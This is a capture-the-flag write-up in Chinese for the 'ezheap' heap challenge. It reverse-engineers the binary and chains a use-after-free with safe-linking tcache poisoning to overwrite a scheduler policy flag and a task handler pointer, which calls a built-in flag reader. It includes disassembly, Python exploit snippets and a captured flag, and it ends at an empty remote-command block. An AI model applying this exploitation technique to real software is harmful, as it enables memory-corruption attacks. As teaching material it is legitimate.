# PolarisCTF `ezheap` 题解

## 题目结果

远程靶机：

```text
nc1.ctfplus.cn 17941
```

实测拿到的 flag：

```text
polarisctf{04177abb-521c-4bb2-9b0d-b5ebdd141273}
```

本题最终 exp 在：

- [solve.py](C:\Users\WYH\Desktop\polarisctf招新赛\pwn\ezheap\solve.py)

---

## 一、先做什么

这题虽然名字叫 `ezheap`，但我一开始并不是直接盯着堆漏洞去看，而是按下面这个顺序逆：

1. 先看菜单功能，搞清楚每个功能对应哪个函数。
2. 再看 `Runtime telemetry`，因为这类题很喜欢在“诊断/日志”接口里白给地址。
3. 然后看 `Bootstrap async scheduler` 和 `Inspect scheduler queue`，确认调度器里有哪些堆对象、它们的布局是什么。
4. 接着看 `Allocate session tensor`、`Complete batch inference`、`Patch session metadata`，确认有没有 UAF、double free、越界写之类的经典堆题入口。
5. 再看 `Provision worker profile`，因为它也是一个独立的堆对象构造器，通常是“同尺寸对象跨类型复用”的关键。
6. 最后看 `Dispatch async task`，确认能不能把某个函数指针打成任意调用。

这个顺序的好处是：

- 前半段先拿“信息泄露”和“目标对象布局”。
- 后半段再去确认“写原语”和“控制流劫持点”。
- 不会一上来就在一大坨 C++ 反编译里迷路。

---

## 二、题目保护

二进制是 `pwn/ezheap/inference_forge`，保护大概是：

- PIE
- Full RELRO
- Canary
- NX

另外 seccomp 只拦了：

- `execve`
- `execveat`

这说明：

- 传统 shell 不是这题的重点。
- 更像是想办法调用程序内部已有的“读 flag”逻辑。

后面确实验证了这一点：程序里本来就有一个会打开 `./flag` 并打印内容的函数。

---

## 三、菜单功能梳理

正式逆菜单之前，我还会先看一眼 `main`，确认程序真正的交互入口在哪里。

`main` 前半段有一大坨不依赖用户输入的位运算、旋转和混合逻辑，最后只是在某个极小概率条件下往 `stderr` 打一句 `never`。这段代码不会修改后续的核心状态，也不会影响菜单逻辑，所以做题时可以先把它视为噪音代码。

`main` 真正和题目有关的部分只有三件事：

1. 初始化一个栈上的 `runtime_ctx`
2. 给 `worker profile` 指针数组分配一块 `0x200` 的堆空间
3. 进入主菜单循环

对应手工整理后的伪代码大概是：

```c
int main() {
    runtime_ctx ctx = {0};

    // 给 worker_profile* 的 vector 预留一块指针数组空间
    void **buf = operator new(0x200);
    ctx.profiles_begin = buf;
    ctx.profiles_end = buf;
    ctx.profiles_cap = (char *)buf + 0x200;

    gateway_menu_loop(&ctx);
    runtime_ctx_cleanup(&ctx);
    free_pointer_range_if_present(&ctx.profiles_begin);
    return 0;
}
```

这里的 `runtime_ctx` 可以理解为“整个程序的总状态对象”。所有菜单函数基本都在读写它。对利用最重要的字段只有这几个：

```c
struct runtime_ctx {
    void *artifact_arena;              // +0x18
    struct queue_ctrl *queue_ctrl;     // +0x20
    struct task_desc *tasks[8];        // +0x28
    struct session *sessions[16];      // +0x68
    uint64_t handle_seq[16];           // +0xE8
    uint8_t active[16];                // +0x168
    struct worker_profile **profiles_begin; // +0x178
    struct worker_profile **profiles_end;   // +0x180
    struct worker_profile **profiles_cap;   // +0x188
};
```

这里顺手说明一下 `0x200` 这块堆内存的意义：

- 它只是 `worker_profile *` 指针数组的底层 buffer
- 也就是 `std::vector<worker_profile *>` 风格的 `begin/end/cap`
- 它本身不是这题的主要攻击目标
- 真正会被利用的是 `option 8` 分配出来的每个 `worker_profile` 对象本体，因为那些对象的大小是 `0x50`

而真正负责交互的是 `sub_8A60`，我把它理解成 `gateway_menu_loop`。它的职责很简单：

1. 打印菜单
2. 打印 `gateway> `
3. `getline(cin, line)`
4. 调一个小 helper 把字符串 trim 后转成整数
5. 按 `switch(cmd)` 分发到各个菜单函数

这个 helper 我会理解成：

```c
bool parse_trimmed_u64(std::string *line, uint64_t *out);
```

所以主循环的骨架其实就是：

```c
void gateway_menu_loop(runtime_ctx *ctx) {
    print_banner_and_menu();
    while (1) {
        std::string line = read_line("gateway> ");
        uint64_t cmd;
        if (!parse_trimmed_u64(&line, &cmd)) {
            puts("invalid");
            continue;
        }
        switch (cmd) {
            ...
        }
    }
}
```

菜单和函数的对应关系如下：

- `0` `Shutdown gateway` -> 打印 `bye` 并退出循环
- `1` `Register model artifact` -> `0x4230`
- `2` `Stream artifact chunk` -> `0x7fb0`
- `3` `Bootstrap async scheduler` -> `0x36a0`
- `4` `Inspect scheduler queue` -> `0x4870`
- `5` `Allocate session tensor` -> `0x4d60`
- `6` `Complete batch inference` -> `0x3910`
- `7` `Patch session metadata` -> `0x55b0`
- `8` `Provision worker profile` -> `0x6e90`
- `9` `Dispatch async task` -> `0x3df0`
- `10` `Runtime telemetry` -> `0x5d60`
- `11` `Operator handbook` -> 打印说明文本

这几个函数里，真正决定利用链的是：

- `0x36a0`
- `0x3910`
- `0x4d60`
- `0x55b0`
- `0x6e90`
- `0x3df0`
- `0x6750`

---

## 四、逆向时先看哪个函数

## 1. 先看 `Runtime telemetry`：拿代码地址

这是我最先重点看的函数之一，因为菜单名字就很像“送调试信息”。

运行时它会打印：

```text
[telemetry] diag.postproc_default=...
[telemetry] diag.audit_sink=...
```

这里的 `diag.audit_sink` 非常关键，因为它直接给了程序内一个函数地址。  
结合 PIE，这相当于直接白给了一条程序内代码指针。

后面验证这个地址对应的是 `0x6750`，也就是本题真正的“读 flag 函数”。

所以第一件事就是记住：

- `audit_sink` 可以泄露 PIE 后的真实地址
- 这个函数大概率就是最终目标

---

## 2. 再看 `0x6750`：确认有没有现成的读 flag 逻辑

`0x6750` 这一段很值得直接看。反汇编里可以看到它：

- 初始化 `ifstream`
- 打开一个固定路径
- 路径字符串在 `0xa385`
- 然后 `getline`
- 再把读到的内容打印出来

对应反汇编关键片段：

```text
6750: ...
682e: lea rsi, [rip+0x3b50]   ; "./flag"
6838: call basic_filebuf::open
68bb: call getline
68cc: lea rsi, [rip+0x3ab8]   ; "[audit] snapshot: "
68d6: call ostream_insert
68e8: call ostream_insert     ; 输出读到的那一行
```

这一步很重要，因为它决定了整题的利用目标：

- 不是 ROP
- 不是 system("/bin/sh")
- 不是 seccomp 绕过
- 而是“想办法让程序自己调 `audit_sink`”

这也解释了为什么 seccomp 只拦 `execve/execveat`，因为题目本身不需要你起 shell。

---

## 3. 看 `Bootstrap async scheduler`：找到一组可劫持的任务描述符

`0x36a0` 是调度器初始化函数。

它做了两件关键事：

1. 先 `malloc(0x38)` 分配 `queue_ctrl`
2. 再循环分配 8 个 `0x50` 大小的 task descriptor

关键片段：

```text
3753: mov edi, 0x38
3758: call malloc
375d: mov [rbp+0x20], rax        ; queue_ctrl

37b3: mov edi, 0x50
37b8: call malloc                ; 每个 task descriptor 都是 0x50

3815: mov [rbx+0x18], rcx        ; handler
3825: mov [rbx+0x0], r14         ; task id
3834: mov [rbx+0x8], r15         ; arg0
383f: mov [rbx+0x20], rbx        ; ctx = self
3848: mov [rbp+r15*8+0x20], rbx  ; 存入 task 数组
```

从这里可以恢复出 task descriptor 的布局：

```c
struct task_desc {
    uint64_t task_id;        // +0x00
    uint64_t arg0;           // +0x08
    uint64_t pad10;          // +0x10
    uint64_t handler;        // +0x18
    uint64_t ctx;            // +0x20
    char tag[0x28];          // +0x28
}; // size = 0x50
```

`Inspect scheduler queue` 也能印证这一点，它会直接打印：

```text
[task:0] desc=... handler=... ctx=... tag='sqe-0'
```

所以到这里我们已经知道：

- 调度器里有 8 个固定存在的 `0x50` 大小堆块
- 每个堆块里都有 `handler` 函数指针
- 如果后面能把某个同尺寸对象分配到它上面，就有机会劫持任务执行流

---

## 4. 看 `Allocate session tensor`：找到第一个 `0x50` 对象

`0x4d60` 会分配一个 session 对象，大小也是 `0x50`：

```text
4fde: mov edi, 0x50
4fe3: call operator new
...
5012: mov [r14+0x8], rax         ; payload 指针
5077: mov [rdx+0x68], r14        ; sessions[slot] = session
508b: mov [r14+0x30], rax        ; handle/counter
5096: mov [r14+0x38], 0x2c50     ; 默认 postproc
```

可以恢复出 session 的主要布局：

```c
struct session {
    uint32_t slot;               // +0x00
    uint32_t tensor_bytes;       // +0x04
    void *payload;               // +0x08
    char alias[0x20];            // +0x10
    uint64_t handle_or_counter;  // +0x30
    void (*postproc)(...);       // +0x38
}; // size = 0x50
```

而且这个菜单会打印：

```text
session tensor ready slot=0 handle=0x... payload=0x... postproc=0x...
```

这里有两个价值：

1. `handle` 就是 session 本体地址，直接给 heap leak。
2. session 的大小也是 `0x50`，和 task descriptor 完全同尺寸。

这意味着：

- session 被 free 之后，非常适合通过 tcache poisoning 去“定向分配”到 task descriptor 上。

---

## 5. 看 `Complete batch inference`：找到 UAF

`0x3910` 是整题最核心的释放点。

关键片段：

```text
3b8e: call rax                   ; 调 postproc
3b90: mov rdi, [r14+0x8]
3b99: call free                  ; free(payload)
3b9e: mov esi, 0x50
3ba6: call operator delete       ; free(session)
3bba: mov byte ptr [...+0x168], 0 ; active flag = 0
```

如果把 C++ 的 `iostream` 噪音和打印逻辑都去掉，它的核心伪代码可以整理成下面这样：

```c
void complete_batch_inference(runtime_ctx *ctx) {
    uint64_t slot = read_u64("session.slot> ");
    if (slot > 15) {
        puts("session slot invalid");
        return;
    }

    if (ctx->active[slot] == 0) {
        puts("session slot not active");
        return;
    }

    session *s = ctx->sessions[slot];
    if (!s) {
        puts("session slot empty");
        return;
    }

    if (s->payload && s->tensor_bytes >= 2) {
        for (size_t i = 1; i < s->tensor_bytes; i++) {
            s->payload[i] ^= (13 * i);
        }
    }

    postproc_fn fn = s->postproc;
    if (fn &&
        fn != session_postproc_default &&
        fn != session_postproc_clamp_negative &&
        fn != session_postproc_shift_right) {
        puts("postproc profile invalid, fallback to default");
        fn = session_postproc_default;
    }

    if (fn)
        fn(s);

    if (s->payload)
        free(s->payload);

    operator delete(s, 0x50);

    ctx->active[slot] = 0;
    // 注意：ctx->sessions[slot] 没有清空

    puts("batch inference finalized, session recycled");
}
```

问题在于：

- 它把 `payload` free 了
- 又把 `session` 对象本身 free 了
- 但是 **没有把 `sessions[slot]` 这个指针清空**
- 只把一个 active 标志位清成了 0

于是形成了：

- `sessions[slot]` 仍然指向一块已经 free 进 tcache 的 `0x50` chunk
- 这是一个标准的 dangling pointer / UAF

这一步是整题第一个漏洞点。

从“设计语义”上看，`option 6` 本来只是“把一个 session 用完后回收掉”。  
它的正常职责是：

- 读 slot
- 做收尾处理
- 释放 payload
- 释放 session
- 把这个 slot 标成 inactive

真正出问题的不是“回收”这个动作本身，而是：

- `active[slot]` 被清了
- `sessions[slot]` 却没清

于是程序逻辑层以为“这个 session 已经回收了”，但数据层还保留着一个指向 freed chunk 的悬空指针。

---

## 6. 看 `Patch session metadata`：把 UAF 变成 tcache poisoning

`0x55b0` 一开始我以为是普通“诊断接口”，但看完反汇编后就知道它是出题人故意留的洞。

关键片段：

```text
5a10: mov r15, [sessions + idx]
5a23: cmp byte ptr [active_flags + idx], 0
5a32: cmp [qword_index], 0
5a3e: mov rax, [qword_value]
5a52: mov [r15], rax
```

如果把它的输入、检查和真正写入动作整理成手工可读的伪代码，大概是：

```c
void patch_session_metadata(runtime_ctx *ctx) {
    uint64_t slot = read_u64("diag.session.slot> ");
    uint64_t qword_index = read_u64("diag.qword_index> ");
    uint64_t qword_value = read_u64("diag.qword_value(u64)> ");

    if (slot > 15) {
        puts("diagnostic patch args invalid");
        return;
    }

    session *s = ctx->sessions[slot];
    if (!s) {
        puts("session handle missing");
        return;
    }

    if (ctx->active[slot] != 0) {
        puts("diagnostic patch requires recycled session");
        return;
    }

    if (qword_index != 0) {
        puts("diagnostic offset policy allows qword_index == 0 only");
        return;
    }

    ((uint64_t *)s)[0] = qword_value;
    printf("diagnostic patch applied at %p\n", s);
}
```

这说明它的逻辑是：

- 取出 `sessions[slot]`
- 要求这个 slot 当前不是 active
- 要求 `qword_index == 0`
- 然后把用户输入的 8 字节写到 `session + 0x0`

正常情况下这只是改 `session->slot` 和后面的字段。  
但如果这个 session 已经被 free 进 tcache，那么：

- `session + 0x0` 这一位置其实正好就是 tcache 单链表的 `fd`

所以这个接口本质上给了我们一个：

- 对 freed `0x50` chunk 的首个 qword 的任意写

这就是标准的 **tcache poisoning 原语**。

从“设计语义”上看，`option 7` 原本是在做“对 recycled session 打一个诊断补丁”。  
单独看它本身，似乎是比较保守的：

- 只允许改 inactive 的 session
- 只允许改第 0 个 qword
- 会打印 patch 作用到哪个地址

但它和 `option 6` 连起来后，语义就彻底变了：

1. `option 6` 把 session free 了
2. 但 `ctx->sessions[slot]` 还悬着
3. `option 7` 再通过这个悬空指针去写 `qword[0]`

于是“诊断补丁”在堆分配器眼里就变成了：

- 对 freed tcache chunk 的 `fd` 指针做可控写

这一步就是整题的第二个漏洞点。

把 `6` 和 `7` 合起来看，最关键的一条链其实非常短：

```c
// option 6 之后
ctx->sessions[slot] = dangling_ptr_to_freed_0x50_chunk;
ctx->active[slot] = 0;

// option 7 再利用这个 dangling pointer
*(uint64_t *)ctx->sessions[slot] = attacker_controlled_value;
```

也就是说：

- `6` 负责制造 UAF
- `7` 负责把 UAF 变成 tcache poisoning 原语

由于 glibc 开了 safe-linking，所以不能直接写目标地址，要写：

```text
encoded_fd = target ^ (chunk_addr >> 12)
```

而 `chunk_addr` 恰好又能从 `Allocate session tensor` 的 `handle=0x...` 直接拿到。

所以这一段组合起来就是：

- heap leak
- UAF
- safe-linking 下的 tcache poisoning

到这里堆利用链就已经成型了。

这里再补一个容易做错的点：  
`option 7` 不是“任意地址任意写”，它的能力非常具体：

- 只能写 `session` 开头 8 字节
- 只能写到一个“已经 recycled”的 session
- 但正因为 free 之后的 tcache 单链表头就在这里，所以这 8 字节已经够用了

对于这题来说，这种“能力不大但刚好够用”的原语，往往比那种看上去更强的 OOB 更容易被利用。

---

## 7. 看 `Provision worker profile`：找到“同尺寸跨类型写覆盖”

`0x6e90` 会分配另一个对象，大小也是 `0x50`。

如果只看 IDA 的伪代码，这个函数会因为 `getline` 和 `std::string` 的异常清理显得特别吵。做题时更好的方法是先抓住它真正的业务骨架：

- 先检查 `worker_profile *` 指针数组是不是还有空间
- `new(0x50)` 申请一个 `worker_profile`
- 连续读 6 个数字字段和 1 个字符串字段
- 用 `parse_trimmed_u64` 把 6 个字符串转成整数
- 把这些值按固定偏移写进对象
- 再把这个指针 push 进 `profiles_begin/end/cap` 管的数组里
- 最后打印 `worker profile provisioned handle=... index=...`

把这些噪音都去掉之后，它的核心伪代码其实很规整：

```c
void provision_worker_profile(runtime_ctx *ctx) {
    worker_profile *w;
    string s_cpu, s_mem, s_io, s_lat, s_rep, s_region, s_memo;

    if (ctx->profiles_end - ctx->profiles_begin > 0x1f8) {
        puts("autoscaler capacity reached");
        return;
    }

    w = new worker_profile;   // size = 0x50
    memset(w, 0, 0x50);

    getline_prompt("worker.cpu_quota> ",   &s_cpu);
    getline_prompt("worker.mem_quota> ",   &s_mem);
    getline_prompt("worker.io_weight> ",   &s_io);
    getline_prompt("worker.latency_slo> ", &s_lat);
    getline_prompt("worker.replicas> ",    &s_rep);
    getline_prompt("worker.region_code> ", &s_region);
    getline_prompt("worker.memo> ",        &s_memo);

    if (!parse_trimmed_u64(&s_cpu,    &w->cpu_quota)   ||
        !parse_trimmed_u64(&s_mem,    &w->mem_quota)   ||
        !parse_trimmed_u64(&s_io,     &w->io_weight)   ||
        !parse_trimmed_u64(&s_lat,    &w->latency_slo) ||
        !parse_trimmed_u64(&s_rep,    &w->replicas)    ||
        !parse_trimmed_u64(&s_region, &w->region_code))
    {
        delete w;
        puts("worker profile parse failed");
        return;
    }

    snprintf(w->memo, 0x20, "%s", s_memo.c_str());
    push_worker_ptr_into_vector(ctx, w);
    printf("worker profile provisioned handle=%p index=%zu\n", w, index);
}
```

它把 6 个用户输入的数字写进这些偏移：

```text
7501: call ... -> [rbx+0x00]
7517: call ... -> [rbx+0x08]
752c: call ... -> [rbx+0x10]
7540: call ... -> [rbx+0x18]
7554: call ... -> [rbx+0x20]
7568: call ... -> [rbx+0x48]
7582: snprintf([rbx+0x28], 0x20, ...)
```

也就是：

```c
struct worker_profile {
    uint64_t cpu_quota;  // +0x00
    uint64_t mem_quota;  // +0x08
    uint64_t io_weight;  // +0x10
    uint64_t latency_slo;// +0x18
    uint64_t replicas;   // +0x20
    char memo[0x20];     // +0x28
    uint64_t region_code;// +0x48
}; // size = 0x50
```

这一步为什么关键：

- `worker_profile` 也是 `0x50`
- 如果通过 tcache poisoning 把它分配到 task descriptor 上
- 那么它写进去的字段就会刚好覆盖：

```text
worker +0x18 -> task->handler
worker +0x20 -> task->ctx
worker +0x28 -> task->tag
```

也就是说，`Provision worker profile` 是这题真正的“覆盖 task descriptor 的写入器”。

但更准确一点说，它其实能干两件事：

1. 如果被 poison 到 `queue_ctrl` 上，它会变成“关闭 policy 的写入器”
2. 如果被 poison 到 `task_desc` 上，它会变成“覆盖 handler/ctx 的写入器”

先看第一种情况。  
`Dispatch async task` 真正检查的是：

```c
ctx->queue_ctrl->strict_policy == 0
```

而 `worker_profile` 的第二个 qword 正好在 `+0x08`：

```text
worker +0x08 -> queue_ctrl +0x08
```

所以只要我们把 `worker_profile` 分配到 `queue_ctrl` 上，再让第二个输入填 `0`，就等价于：

```c
*(uint64_t *)(queue_ctrl + 0x8) = 0;
```

这就是为什么前半段利用里，会看到一组看起来很朴素的输入：

```python
queue_vals = [0, 0, 0, 0, 0, 0]
```

这不是随便填的，而是在故意把 `queue_ctrl+0x8` 也一起清掉。

再看第二种情况。  
如果这个 `worker_profile` 落到 `task_desc` 上，那么最关键的两个字段会对齐到：

```text
worker +0x18 -> task_desc->handler
worker +0x20 -> task_desc->ctx
```

于是只要控制：

```c
w->latency_slo = audit_sink;
w->replicas    = task0_desc;
```

就等价于：

```c
task0_desc->handler = audit_sink;
task0_desc->ctx     = task0_desc;
```

这样最后按 `9` 时，程序才会真的去调用我们想要的函数。

所以 `option 8` 在利用里的真实角色不是“创建 worker”，而是：

- 一个 `0x50` 分配器
- 一个固定偏移写模板
- 一个把 poison 结果真正落实成目标对象字段覆写的工具

---

## 8. 最后看 `Dispatch async task`：确认真实调用条件

`0x3df0` 是最后一步，必须看得很细，因为很多人会在这里误判条件。

一开始如果只看 IDA 自动生成的伪代码，很容易误以为它是“无条件取某个 task 调用 handler”。  
但这个函数的 jump/条件分支比较多，最稳的做法是直接看反汇编。把 `getline` 和打印噪音去掉后，它的真实逻辑其实是：

```c
void dispatch_async_task(runtime_ctx *ctx) {
    uint64_t task_id;
    task_desc *desc;
    void (*handler)(void *);

    if (ctx->queue_ctrl == NULL) {
        puts("scheduler offline");
        return;
    }

    task_id = read_u64("queue.task_id> ");
    if (task_id > 7) {
        puts("task id invalid");
        return;
    }

    desc = ctx->tasks[task_id];
    if (desc == NULL || desc->handler == NULL) {
        puts("task descriptor unavailable");
        return;
    }

    handler = desc->handler;

    if (handler == task_runner_log_ack ||
        handler == task_runner_xor_ack ||
        handler == task_runner_mul_ack ||
        ctx->queue_ctrl->strict_policy == 0)
    {
        handler(desc->ctx);
        return;
    }

    puts("policy engine blocked non-whitelisted handler");
}
```

关键反汇编片段是：

```text
3e12: cmp qword ptr [rdi+0x20], 0   ; ctx->queue_ctrl
3e31: "queue.task_id> "
3ed9: cmp eax, 7                    ; task id 必须 0..7
3fb0: rcx = task_desc
3fbe: rax = task->handler
3fcb: rdx = queue_ctrl
3fd6: cmp byte ptr [rdx+0x8], 0
3fda: sete dl

3fdd: cmp rax, 0x30a0
3fe4: or edx, esi
3fed: cmp rax, 0x2ff0
3ff4: or dl, sil
3ff9: cmp rax, 0x2f40
4003: jne block

4009: mov rdi, [rcx+0x20]
400d: call rax
```

这个判断非常重要，结论是：

- 允许直接执行的白名单 handler 有 3 个：
  - `0x30a0`
  - `0x2ff0`
  - `0x2f40`
- 除此以外，只要 `queue_ctrl + 0x8` 这个字节是 0，也能放行

这三个白名单函数对应的是正常业务 handler：

- `0x30a0` `task_runner_log_ack`
- `0x2ff0` `task_runner_xor_ack`
- `0x2f40` `task_runner_mul_ack`

注意这里很多人容易误判成：

- `task->ctx[8] == 0`

其实不是。  
这里检查的是：

- `queue_ctrl` 指针指向对象的 `+0x8`

这个细节决定了最终利用链不是“一次覆写 task->handler/ctx 就结束”，而是必须：

1. 先想办法把 `queue_ctrl+0x8` 清零，关闭 policy
2. 再去覆写 task descriptor 的 `handler`

这也是我做题时中间踩过的一次坑。

这里还得再强调一下 `option 9` 的定位：

- 它不是后门
- 它不是漏洞点
- 它只是最终触发器

也就是说，直接按 `9` 本身不会出 flag。  
默认情况下 `task_desc->handler` 还是程序初始化时写进去的那 3 个业务 handler 之一，所以你直接 dispatch 只会执行正常任务流程，不会执行 `audit_sink`。

这题真正要做的是：

1. 先把 `9` 里会读取的对象改掉
2. 再让 `9` 去调用被你改过的 `handler`

所以 `9` 的真实语义不是“菜单里的后门”，而是：

```c
if (白名单通过)
    task[task_id]->handler(task[task_id]->ctx);
```

一旦把这个函数理解清楚，后面的利用思路就会自然很多。

---

## 五、漏洞点总结

这题本质上是两个漏洞拼起来：

## 漏洞 1：`Complete batch inference` 造成 UAF

现象：

- free 了 session 本体
- 但 `sessions[slot]` 没清空

影响：

- 仍可通过菜单继续访问已经 free 的 chunk

## 漏洞 2：`Patch session metadata` 可写 freed chunk 的首 qword

现象：

- 允许对 recycled session 的 `qword_index == 0` 位置写 8 字节

影响：

- 如果该 chunk 在 tcache 里，就能改 tcache `fd`
- 得到 safe-linking 条件下的 tcache poisoning

## 辅助条件：存在多个同尺寸 `0x50` 对象

题里恰好有三类 `0x50` 对象：

- `session`
- `task descriptor`
- `worker profile`

这意味着：

- 用 `session` 释放制造 tcache 空洞
- 用 `worker profile` 作为“可控写入器”
- 把它精确分配到 `task descriptor` 或 `queue_ctrl` 上

这是典型的“跨类型 chunk 复用”。

---

## 六、利用思路怎么一步步出来的

这里按真实做题顺序来讲。

## 第一步：先拿地址

通过：

- `Inspect scheduler queue`
- `Runtime telemetry`

拿到：

- `queue_ctrl` 地址
- `task[0].desc` 地址
- `audit_sink` 地址

这一步拿到了：

- heap 上的关键目标地址
- 程序内部最终要调用的函数地址

---

## 第二步：先验证能不能把 `worker profile` 打到 `task descriptor`

思路是：

1. 分配两个 session
2. 依次 free
3. 对后 free 的那个 chunk 做 `fd` poison
4. 先 malloc 一次吃掉链表头
5. 再分配 `worker profile`

为什么要分配两个 session，而不是一个？

因为 tcache 除了 head 指针，还有 `count`。  
如果只 free 一个 chunk：

- 第一次 malloc 取走它后，`count` 会变成 0
- 即使 head 已经被改成目标地址，第二次 malloc 也不会再从 tcache 取

所以正确姿势是：

- 先让 tcache bin 里至少有两个 chunk
- poison head
- 第一次 malloc 消耗掉 head 后，`count` 仍然大于 0
- 第二次 malloc 才会真正返回伪造出来的目标地址

这个点非常关键，也是这题最容易漏掉的利用细节之一。

safe-linking 的编码公式是：

```python
encoded = target ^ (freed_chunk_addr >> 12)
```

我们在 exp 里就是这么算的。

---

## 第三步：一开始最朴素的想法，其实是“直接打 `task_desc->handler`”

拿到上面的信息之后，一个正常人脑子里最先冒出来的思路通常不是“先打 `queue_ctrl`”，而是：

1. 题里已经有 `audit_sink`
2. `Dispatch async task` 最后会 `call handler(ctx)`
3. 那我直接把 `task0_desc->handler` 改成 `audit_sink`
4. 再按 `9`

这一步其实完全合理，而且几乎所有人第一反应都会这么想。

真正改变思路的地方在于：  
当你准备这么打的时候，一定会回头把 `Dispatch async task` 再精读一遍，确认它是不是真的“无条件 call”。

而一旦读到这个判断：

```c
if (handler == task_runner_log_ack ||
    handler == task_runner_xor_ack ||
    handler == task_runner_mul_ack ||
    ctx->queue_ctrl->strict_policy == 0)
{
    handler(desc->ctx);
}
else {
    puts("policy engine blocked non-whitelisted handler");
}
```

思路就会立刻分成两条：

1. 让 `handler` 仍然等于那 3 个白名单函数之一
2. 或者把 `strict_policy` 清零

第一条路为什么不走？

- 因为那 3 个白名单 handler 都只是正常业务逻辑
- 它们不是 `audit_sink`
- 保持白名单并不能直接读 flag

于是第二条路就变成了最自然的绕过方向：

- 既然 `audit_sink` 不在白名单里
- 那就先把 `strict_policy` 打成 0
- 再把 `handler` 改成 `audit_sink`

这就是“为什么会想到先打 `queue_ctrl`”。

不是因为一开始就先验知道答案，而是因为 `option 9` 这个 if 条件把利用链强行分成了两段。

---

## 第四步：先打 `queue_ctrl`，关闭 policy

因为 `Dispatch async task` 会检查：

```text
*(queue_ctrl + 0x8) == 0
```

所以接下来的问题就变成：

- 我怎么把 `queue_ctrl + 0x8` 写成 0？

答案正是前面已经拿到的两个组件：

1. `option 7` 可以 poison 下一个 `0x50` malloc 的落点
2. `option 8` 会把第二个 qword 写到对象的 `+0x08`

所以最自然的组合就是：

1. 先对 `queue_ctrl` 做一次 tcache poisoning
2. 再让 `worker_profile` 分配到 `queue_ctrl`
3. 用 `worker.mem_quota = 0` 去覆盖 `queue_ctrl + 0x08`

也就是：

```text
worker +0x08 -> queue_ctrl +0x08 -> strict_policy
```

于是 exploit 里的第一段就成了：

```c
poison_next_0x50_malloc_to(queue_ctrl);
allocate_one_session_to_consume_poisoned_head();
provision_worker_profile(all_zero_fields);
```

这样：

```c
queue_ctrl->strict_policy = 0;
```

就成立了。

从菜单角度看，这一步其实对应的是：

1. `3` 先把 `queue_ctrl` 建出来
2. `4` 把 `queue_ctrl` 地址泄露出来
3. `5` / `6` / `7` 做一次 tcache poison，目标设成 `queue_ctrl`
4. 再 `5` 一次，吃掉 poisoned head
5. 最后 `8` 真正覆写 `queue_ctrl`

然后输入全 0：

```python
queue_vals = [0, 0, 0, 0, 0, 0]
```

这样：

- `queue_ctrl+0x0`
- `queue_ctrl+0x8`
- `queue_ctrl+0x10`
- ...

都会被写成 0，尤其是：

- `queue_ctrl+0x8 == 0`

这就把策略检查关掉了。

这一步是最终利用链里真正的“第一段覆写”。

---

## 第五步：再打 `task[0]`，改 handler 为 `audit_sink`

接着重复一次同样的 tcache poisoning，不过这次目标改成：

```text
target = task0_desc
```

然后再用 `Provision worker profile` 覆写 task descriptor：

```python
values = [
    0x1111111111111111,   # +0x00
    0x100,                # +0x08
    0x3333333333333333,   # +0x10
    audit_sink,           # +0x18 -> handler
    target,               # +0x20 -> ctx
    0x6666666666666666,   # +0x48
]
```

也就是把：

- `task->handler = audit_sink`
- `task->ctx = task0_desc`

由于前一步已经把 policy 关掉了，所以这时 `Dispatch async task` 就不会再拦这个 handler。

---

## 第六步：最后再按 `9`，这时它才会变成“读 flag 的入口”

最后只要：

```text
dispatch task 0
```

执行流就会走到：

```text
call task->handler(task->ctx)
```

也就是：

```c
audit_sink(task0_desc);
```

而 `audit_sink` 本身会：

1. 打开 `./flag`
2. 读一行
3. 输出：

```text
[audit] snapshot: <flag>
```

于是题目结束。

这里也能顺手回答一个很容易困惑的问题：

- 为什么不是一开始直接按 `9`？

因为：

1. 默认情况下 `task_desc->handler` 还是内置业务函数，不是 `audit_sink`
2. 就算你先改了 `handler`，如果 `strict_policy` 还开着，也会被白名单拦住

所以 `9` 一定是最后一步，不能是第一步。

---

## 第七步：为什么这条链基本没法再压成“一段”

很多人做到这里会继续想：

- 能不能一次 poison 同时把 `queue_ctrl` 和 `task_desc` 都打了？
- 能不能省掉“先关 policy”这一步？

我本地实际看过 `bootstrap` 后的堆布局，多次运行都能稳定看到：

```text
queue_ctrl = 0x....520
task0_desc = 0x....560
```

也就是说：

```text
task0_desc - queue_ctrl = 0x40
```

我们真正想同时打到的两个点是：

- `queue_ctrl + 0x08`    -> `strict_policy`
- `task0_desc + 0x18`    -> `handler`

这两个点的距离是：

```text
(task0_desc + 0x18) - (queue_ctrl + 0x08) = 0x50
```

但 `worker_profile` 这次能覆盖到的最后一个关键 qword 在：

```text
+0x48
```

所以单次 `worker_profile` 覆写的可达范围不够同时碰到这两个目标位。  
也就是说：

- 不能一枪同时关 `strict_policy`
- 再顺带把 `handler` 改掉

这也是为什么最后的 exp 会稳定收束成“两段 poison + 两次 option 8”的结构。

---

## 七、最终利用链

把上面的分析收束成最简 exploit 流程，就是：

1. `bootstrap scheduler`
2. `inspect queue` 泄露 `queue_ctrl` 和 `task0_desc`
3. `telemetry` 泄露 `audit_sink`
4. 分配两个 session，free 掉，poison 到 `queue_ctrl`
5. 分配一次 session 吃掉 poisoned head
6. 分配 `worker profile` 到 `queue_ctrl`，把 `queue_ctrl+0x8` 清零
7. 再分配两个 session，free 掉，poison 到 `task0_desc`
8. 分配一次 session 吃掉 poisoned head
9. 分配 `worker profile` 到 `task0_desc`，把 `handler` 改成 `audit_sink`
10. `dispatch task 0`
11. 打印 flag

---

## 八、exp 关键代码

完整代码见：

- [solve.py](C:\Users\WYH\Desktop\polarisctf招新赛\pwn\ezheap\solve.py)

核心的 tcache poisoning 逻辑是：

```python
def poison_with_two_sessions(io, slot0, slot1, consume_slot, target, label):
    sess0 = alloc_session(io, slot0, 0x10, label + b"0")
    sess1 = alloc_session(io, slot1, 0x10, label + b"1")
    complete_session(io, slot0)
    complete_session(io, slot1)
    encoded = target ^ (sess1["handle"] >> 12)
    patch_qword(io, slot1, 0, encoded)
    consume = alloc_session(io, consume_slot, 0x10, label + b"2")
    return sess0, sess1, consume, encoded
```

关闭 policy：

```python
_, _, _, encoded0 = poison_with_two_sessions(io, 0, 1, 2, queue_ctrl, b"Q")
queue_vals = [0, 0, 0, 0, 0, 0]
provision_worker(io, queue_vals, b"policy-off")
```

覆写 task descriptor：

```python
_, _, _, encoded1 = poison_with_two_sessions(io, 3, 4, 5, target, b"T")
values = [
    0x1111111111111111,
    0x100,
    0x3333333333333333,
    audit_sink,
    target,
    0x6666666666666666,
]
provision_worker(io, values, b"owned")
dispatch(io, 0)
```

---

## 九、远程利用

远程命令：

```bash
